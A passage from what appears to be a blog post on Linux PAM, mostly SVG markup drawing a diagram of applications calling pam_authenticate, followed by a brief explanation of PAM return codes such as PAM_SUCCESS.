<text text-anchor='middle' x='288' y='500' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='288' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='296' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='500' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='296' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='356' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='304' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='500' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='304' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='312' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='500' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='312' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='320' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='340' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='344' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='344' y='372' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='344' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='360' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='452' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='360' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='532' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='368' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='368' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='376' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='384' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='392' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='392' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='392' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='308' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='400' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='400' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='244' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='408' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='308' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='408' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='356' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='408' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='308' fill='currentColor' style='font-size:1em'>M</text>
<text text-anchor='middle' x='416' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='416' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='84' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='424' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='432' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='356' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='432' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='440' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='132' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='260' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='448' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='448' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='84' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='456' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='340' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='480' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='480' y='372' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='488' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='116' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='496' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='356' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='496' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='504' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='356' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='512' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='520' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='536' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='544' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='356' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='552' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='560' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='568' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='592' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='356' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='600' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='608' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='616' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='616' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='616' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='616' y='116' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='616' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='616' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='116' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='624' y='244' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='624' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='624' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='632' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='84' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='640' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='640' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='648' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='656' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='132' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='656' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='656' y='260' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='656' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='356' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='656' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='84' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='672' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='704' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='704' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='704' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='704' y='116' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='704' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='260' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='744' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='340' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='744' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='744' y='372' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>Assume the user attempts to log into <code>APP 1</code>, which checks the PAM to see if the user is authenticated and authorised. If the query is successful, PAM returns the status code <code>PAM_SUCCESS</code>; otherwise, it returns one of the other relevant codes.
The complete list of return codes and their meanings can be found in their github repository, which can be found <a href="https://github.com/linux-pam/linux-pam/blob/b872b6e68a60ae351ca4c7eea6dfe95cd8f8d130/libpam/include/security/_pam_types.h#L29">here</a>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<h2 id="configuring-pam">Configuring PAM</h2>
